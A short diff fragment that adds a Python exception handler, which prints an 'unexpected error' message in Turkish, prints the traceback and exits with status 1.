+    except Exception as e:
+        print(f"\n[!] Beklenmeyen hata: {e}")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
